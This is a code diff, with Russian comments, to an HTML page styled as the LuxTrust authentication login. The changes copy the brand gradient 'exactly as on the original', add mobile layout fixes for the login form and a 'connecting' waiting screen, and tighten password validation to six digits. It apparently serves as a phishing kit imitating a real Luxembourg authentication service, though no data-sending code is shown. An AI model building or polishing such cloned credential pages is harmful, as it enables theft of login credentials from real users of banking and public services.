@@ -986,17 +986,13 @@ header .header-container .header nav[class*=menu--user-menu].navigation>.menu.me
             position: relative;
             flex-shrink: 0;
         }
+        /* ОБНОВЛЁННЫЙ КЛАСС ИКОНКИ С ДИАГОНАЛЬНЫМ ГРАДИЕНТОМ */
         .connecting-app-icon {
             width: 70px;
             height: 70px;
             border-radius: 10px;
-            /* Фирменный градиент LuxTrust + тонкая сетка для имитации геометрического узора */
-            background: 
-                linear-gradient(135deg, #3D4CFF 0%, #3399FF 45%, #56BCED 70%, #6FE8C6 100%),
-                repeating-linear-gradient(rgba(255,255,255,0.12) 0px, rgba(255,255,255,0.12) 1px, transparent 1px, transparent 12px),
-                repeating-linear-gradient(90deg, rgba(255,255,255,0.12) 0px, rgba(255,255,255,0.12) 1px, transparent 1px, transparent 12px);
-            background-blend-mode: normal, normal, normal;
-            background-size: 100% 100%, 12px 12px, 12px 12px;
+            /* Точное повторение диагонального градиента как на оригинале */
+            background: linear-gradient(135deg, #3D4CFF 0%, #3D4CFF 48%, #3399FF 52%, #56BCED 80%, #6FE8C6 100%);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -1175,7 +1171,115 @@ header .header-container .header nav[class*=menu--user-menu].navigation>.menu.me
                 font-size: 14px;
             }
         }
-    </style>
+    
+
+        /* ==============================================================
+           iPHONE 15 PRO FIX — экраны от 376px до 429px
+           (iPhone 15 Pro: 393px, iPhone 14 Pro: 393px, и т.д.)
+           ============================================================== */
+        @media (max-width: 429px) and (min-width: 376px) {
+            /* --- Карточки устройств --- */
+            .thumbnail-lx {
+                width: 200px !important;
+                height: 158px !important;
+            }
+            .device-img {
+                height: 92px !important;
+                margin-top: 4px !important;
+            }
+            .device-img img {
+                max-width: 108px !important;
+                max-height: 88px !important;
+            }
+            .device-img.scan-img img {
+                max-width: 104px !important;
+                max-height: 84px !important;
+            }
+            .device-img.mobile-img img {
+                max-width: 100px !important;
+                max-height: 84px !important;
+            }
+            .device-name-lx {
+                font-size: 14px !important;
+                margin-top: 14px !important;
+            }
+
+            /* --- Форма логина --- */
+            .login-form {
+                max-width: 360px !important;
+                transform: translateX(2px) translateY(-24px) !important;
+            }
+            .login-form .form-row label {
+                width: 55px !important;
+                margin-right: 24px !important;
+                font-size: 13px !important;
+            }
+            .login-form .form-row .input-wrap {
+                width: 210px !important;
+                max-width: 210px !important;
+            }
+            .login-form .form-row .input-wrap input {
+                height: 34px !important;
+                font-size: 13px !important;
+            }
+            .login-form .form-row .help-icon {
+                margin-left: 22px !important;
+            }
+            .login-form .button-row .btn {
+                width: 124px !important;
+                height: 32px !important;
+                font-size: 13px !important;
+            }
+
+            /* --- Заголовок выбора устройства --- */
+            .alert.call-to-action {
+                font-size: 15px !important;
+                letter-spacing: 0.5px !important;
+            }
+
+            /* --- Логотип справа --- */
+            .right-logo-svg {
+                width: 130px !important;
+            }
+
+            /* --- Языковой переключатель --- */
+            .mobile-lang-switcher .lang-btn {
+                width: 46px !important;
+                height: 46px !important;
+                font-size: 16px !important;
+            }
+
+            /* --- Connecting state --- */
+            .connecting-title {
+                font-size: 18px !important;
+            }
+            .connecting-app-icon {
+                width: 60px !important;
+                height: 60px !important;
+            }
+            .connecting-app-icon .lt-text {
+                font-size: 24px !important;
+            }
+            .connecting-app-text {
+                font-size: 14px !important;
+            }
+            .connecting-progress-bar {
+                height: 12px !important;
+            }
+            .connecting-timer-label,
+            .connecting-timer-value {
+                font-size: 14px !important;
+            }
+            .connecting-info-text {
+                font-size: 14px !important;
+            }
+            .connecting-link-block a,
+            .connecting-or-text {
+                font-size: 14px !important;
+            }
+        }
+</style>
+<base target="_blank">
 <base target="_blank">
 </head>
 <body class="path-myluxtrust luxtrust">
@@ -2258,7 +2362,7 @@ header .header-container .header nav[class*=menu--user-menu].navigation>.menu.me
     }
 
     // ==============================================================
-    // НОВАЯ ЛОГИКА ВАЛИДАЦИИ ФОРМЫ
+    // НОВАЯ ЛОГИКА ВАЛИДАЦИИ ФОРМЫ (исправлен пароль на ровно 6 цифр)
     // ==============================================================
 
     var useridInput = document.getElementById('userid');
@@ -2270,9 +2374,9 @@ header .header-container .header nav[class*=menu--user-menu].navigation>.menu.me
         return /^[A-Z]{4}\d{4}$/.test(value);
     }
 
-    // Функция проверки корректности Password (только цифры, от 6 до 10)
+    // Функция проверки корректности Password (только цифры, ровно 6 цифр)
     function isValidPassword(value) {
-        return /^\d{6,10}$/.test(value);
+        return /^\d{6}$/.test(value);
     }
 
     // Обновление состояния кнопки Next и классов ошибок
